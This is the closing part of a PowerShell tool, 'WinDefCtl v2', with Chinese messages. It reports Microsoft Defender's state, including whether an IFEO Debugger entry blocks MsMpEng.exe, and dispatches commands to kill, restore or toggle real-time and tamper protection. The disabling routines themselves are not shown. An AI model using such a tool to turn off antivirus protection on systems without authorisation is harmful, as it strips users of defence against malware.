    $msmpeng = (Get-Process -Name MsMpEng -EA SilentlyContinue)

    Write-Host ("  IFEO 阻止（MsMpEng.exe Debugger）：{0}" -f $(if ($ifeoBlocked) { '是' } else { '否' }))
    Write-Host ("  WinDefend 服务状态               ：{0}" -f $(if ($wd) { $wd.Status } else { '未安装' }))
    Write-Host ("  SecurityHealthService 服务状态   ：{0}" -f $(if ($sh) { $sh.Status } else { '未安装' }))
    Write-Host ("  MsMpEng.exe 进程状态             ：{0}" -f $(if ($msmpeng) { '正在运行' } else { '未运行' }))

    $state = if ($ifeoBlocked) { 'IFEO 已阻止' }
             elseif ($wd -and $wd.Status -eq 'Running') { '活动' }
             else { '非活动' }
    Write-Host ("  ==> 状态：{0}" -f $state) -F Yellow
    return 0
}

# ============================================================================
# 主调度
# ============================================================================

Write-Host ''
Write-Host ("=== WinDefCtl v2  -  $Command $Action ===") -F Cyan
Write-Host ''

$exit = 0
switch ($Command) {
    'rtp'      { $exit = Invoke-DefenderUI -Cmd 'rtp' -Act $Action }
    'tp'       { $exit = Invoke-DefenderUI -Cmd 'tp'  -Act $Action }
    'kill'     { $exit = Invoke-Kill }
    'restore'  { $exit = Invoke-Restore }
    'status'   { $exit = Invoke-Status }
}

Write-Host ''
exit $exit